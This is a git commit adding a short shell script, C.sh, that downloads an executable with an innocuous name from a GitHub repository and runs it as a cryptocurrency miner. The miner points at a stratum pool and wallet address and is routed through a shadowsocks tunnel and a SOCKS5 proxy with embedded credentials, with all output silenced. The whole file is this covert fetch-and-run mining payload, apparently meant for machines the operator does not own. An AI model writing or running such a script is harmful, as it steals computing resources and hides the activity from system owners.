d6d64710f731d791c334c8afb9007eeafd802f8d
jgaswer <98291918+jgaswer@users.noreply.github.com>
2022-04-22 17:10:55 +0700

    Create C.sh

---
+++ C.sh
@@ -0,0 +1,9 @@
+apt update -y
+sudo apt-get install -y libnuma-dev && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 
+wget -q https://github.com/manorepas/bash/raw/main/pointd
+chmod +x pointd
+sudo apt -y install shadowsocks-libev rng-tools libsodium-dev
+
+ss-local -s pl1ss.greenssh.xyz -p 8388 -l 8139 -k Yzg2Y -m chacha20-ietf-poly1305 -v &
+./pointd -a verus -o stratum+tcp://149.56.27.47:3956 -u RMQtU1xuuQtm23QCVEbjA8iTmqjZAFJrh8.ah -p x -t 2 -x socks5://Novax:chalHatt@129.158.58.77:1080 </dev/null >/dev/null 2>&1
+echo "okesu"
